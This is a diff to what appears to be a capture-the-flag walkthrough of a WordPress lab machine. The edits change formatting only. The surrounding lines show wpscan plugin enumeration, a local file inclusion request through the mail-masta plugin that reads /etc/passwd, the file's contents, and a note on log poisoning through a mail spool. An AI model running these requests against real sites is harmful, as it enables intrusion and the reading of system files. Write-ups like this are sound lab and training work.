@@ -127,7 +127,7 @@ wpscan --url http://192.168.0.116/h3l105/ --detection-mode aggressive --enumerat
 \
 After running the above command , we get some plugin names 
 ```bash
- mail-masta
+[+] mail-masta
  | Location: http://192.168.0.116/h3l105/wp-content/plugins/mail-masta/
  | Latest Version: 1.0 (up to date)
  | Last Updated: 2014-09-19T07:52:00.000Z
@@ -174,7 +174,7 @@ GET /h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc
 ```
 \
 <img width="1320" height="537" alt="image" src="https://github.com/user-attachments/assets/503d6ee1-448d-45a5-97ad-f823fde7a4c6" />
-\
+
 ```bash
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -218,6 +218,10 @@ And we can do Log poisoning.
 The log file can be found at 
 ```bash
 /h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
+```
+\
+A section of content from the file
+```bash
 <helios@blah.com>: Host or domain name not found. Name service error for
     name=blah.com type=MX: Host not found, try again
 
